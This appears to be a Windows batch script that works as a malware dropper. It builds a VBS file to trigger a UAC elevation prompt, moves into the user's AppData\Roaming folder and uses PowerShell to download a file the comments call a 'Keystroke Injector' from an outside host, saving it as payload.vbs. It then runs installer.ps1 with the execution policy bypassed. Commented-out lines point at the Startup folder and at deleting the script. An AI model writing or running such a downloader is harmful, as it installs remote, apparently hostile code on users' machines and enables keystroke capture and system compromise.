@REM @echo off

@REM -------------------------------------------------------------------------------------------------------------------------------------
:: Check for Administrator privileges
if "%LOGONSERVER%"=="." (
    echo This script must be run as Administrator.
    pause
    exit /B 1
)

:: If not elevated, prompt for elevation
echo Set UAC = CreateObject("Shell.Application") > elevate.vbs
echo UAC.ShellExecute "%~nx0", "", "", "runas", 1 >> elevate.vbs
start /wait elevate.vbs
del elevate.vbs
@REM -------------------------------------------------------------------------------------------------------------------------------------

SET currentDirectory=%cd%
SET TARGETDIR="C:\Users\%username%\AppData\Roaming\"
@REM SET TargetLocToGetFile=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@REM SET TargetFile="%currentDirectory%\module_downloader.cmd"

cd %TARGETDIR%

@REM -------------------------------------------------------------------------------------------------------------------------------------

@REM download Keystroke Injector
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/hello.vbs' -OutFile payload.vbs"
@REM payload.vbs

@REM -------------------------------------------------------------------------------------------------------------------------------------

cd %currentDirectory%
@REM del module_downloader.cmd
powershell -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"